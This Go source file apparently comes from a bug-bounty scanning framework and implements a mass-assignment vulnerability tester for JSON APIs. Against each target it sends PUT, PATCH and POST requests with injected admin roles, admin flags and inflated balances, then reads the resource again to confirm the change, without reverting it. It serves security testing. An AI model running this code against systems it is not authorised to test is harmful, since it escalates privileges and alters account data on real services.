package tools

import (
	"github.com/Developer-Army/BBPTS/internal/domain/recon"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"strings"
	"sync"
	"time"

	"golang.org/x/time/rate"
)

type MassAssignmentTool struct{}

func (t *MassAssignmentTool) Name() string {
	return "mass_assignment"
}

func (t *MassAssignmentTool) Run(ctx context.Context, scanCtx *recon.ScanContext, targets []string, threads int) ([]recon.Event, error) {
	if len(targets) == 0 {
		return nil, nil
	}

	rateLimit := ToolRateLimitFromCtx(ctx, t.Name())
	if rateLimit <= 0 {
		rateLimit = 50
	}
	pool := NewWorkerPool(threads, rate.Limit(rateLimit))

	return pool.Process(ctx, targets, func(ctx context.Context, target string) ([]recon.Event, error) {
		target = strings.TrimSpace(target)
		if target == "" {
			return nil, nil
		}

		if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
			target = "https://" + target
		}

		client := NewSafeHTTPClient(10 * time.Second)

		// 1. Fetch current resource via GET
		req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
		if err != nil {
			return nil, nil
		}
		for k, v := range scanCtx.Headers {
			req.Header.Set(k, v)
		}

		resp, err := client.Do(req)
		if err != nil {
			return nil, nil
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			return nil, nil
		}

		bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
		if err != nil {
			return nil, nil
		}

		// Try parsing JSON to find keys
		var data map[string]interface{}
		if err := json.Unmarshal(bodyBytes, &data); err != nil {
			// Not a JSON API endpoint, skip
			return nil, nil
		}

		// 2. Identify potential parameters to test for mass assignment
		// Let's look for keys in the response or try adding standard privilege keys
		testKeys := []string{"role", "isAdmin", "is_admin", "admin", "privileges", "permissions", "verified", "balance", "credits", "tier", "status"}
		payload := make(map[string]interface{})

		// Copy existing data to preserve structure, if any
		for k, v := range data {
			payload[k] = v
		}

		// Inject/overwrite keys
		injectedValues := make(map[string]interface{})
		for _, key := range testKeys {
			if _, exists := data[key]; !exists {
				// Inject the key
				if strings.Contains(strings.ToLower(key), "admin") || strings.Contains(strings.ToLower(key), "verified") {
					payload[key] = true
					injectedValues[key] = true
				} else if strings.Contains(strings.ToLower(key), "role") {
					payload[key] = "admin"
					injectedValues[key] = "admin"
				} else if strings.Contains(strings.ToLower(key), "balance") || strings.Contains(strings.ToLower(key), "credits") {
					payload[key] = 99999
					injectedValues[key] = 99999
				} else if strings.Contains(strings.ToLower(key), "tier") {
					payload[key] = "premium"
					injectedValues[key] = "premium"
				}
			} else {
				// Key already exists, try to elevate it
				val := data[key]
				if b, ok := val.(bool); ok && !b {
					payload[key] = true
					injectedValues[key] = true
				} else if s, ok := val.(string); ok && s != "admin" {
					payload[key] = "admin"
					injectedValues[key] = "admin"
				}
			}
		}

		if len(injectedValues) == 0 {
			return nil, nil
		}

		// 3. Re-send the resource update request via PUT (or POST/PATCH)
		// We'll try PUT first, as it is standard for resource replacement
		methodsToTest := []string{"PUT", "PATCH", "POST"}
		var events []recon.Event
		var mu sync.Mutex

		for _, method := range methodsToTest {
			payloadBytes, err := json.Marshal(payload)
			if err != nil {
				continue
			}

			upReq, err := http.NewRequestWithContext(ctx, method, target, bytes.NewReader(payloadBytes))
			if err != nil {
				continue
			}
			upReq.Header.Set("Content-Type", "application/json")
			for k, v := range scanCtx.Headers {
				upReq.Header.Set(k, v)
			}

			upResp, err := client.Do(upReq)
			if err != nil {
				continue
			}
			upBody, _ := io.ReadAll(io.LimitReader(upResp.Body, 64*1024))
			upResp.Body.Close()

			// Check if accepted
			if upResp.StatusCode == http.StatusOK || upResp.StatusCode == http.StatusNoContent || upResp.StatusCode == http.StatusCreated {
				// 4. Verify by GETting the resource again
				verifyReq, err := http.NewRequestWithContext(ctx, "GET", target, nil)
				if err != nil {
					continue
				}
				for k, v := range scanCtx.Headers {
					verifyReq.Header.Set(k, v)
				}

				verifyResp, err := client.Do(verifyReq)
				if err != nil {
					continue
				}
				verifyBody, _ := io.ReadAll(io.LimitReader(verifyResp.Body, 64*1024))
				verifyResp.Body.Close()

				var verifyData map[string]interface{}
				if err := json.Unmarshal(verifyBody, &verifyData); err == nil {
					// Check if any injected key holds the updated value
					successKeys := []string{}
					for k, v := range injectedValues {
						if actualVal, found := verifyData[k]; found {
							if fmt.Sprintf("%v", actualVal) == fmt.Sprintf("%v", v) {
								successKeys = append(successKeys, fmt.Sprintf("%s=%v", k, v))
							}
						}
					}

					if len(successKeys) > 0 {
						mu.Lock()
						events = append(events, recon.NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
							"vuln_name":   "Mass Assignment API Vulnerability",
							"severity":    "high",
							"method":      method,
							"parameters":  strings.Join(successKeys, ", "),
							"evidence":    string(upBody),
							"description": fmt.Sprintf("Successfully modified parameters [%s] via %s request to target.", strings.Join(successKeys, ", "), method),
						}, "high"))
						mu.Unlock()
						slog.Warn("Found Mass Assignment vulnerability", "target", target, "keys", successKeys)
						break // Detected via one method is enough
					}
				}
			}
		}

		return events, nil
	})
}

var _ recon.Tool = (*MassAssignmentTool)(nil)
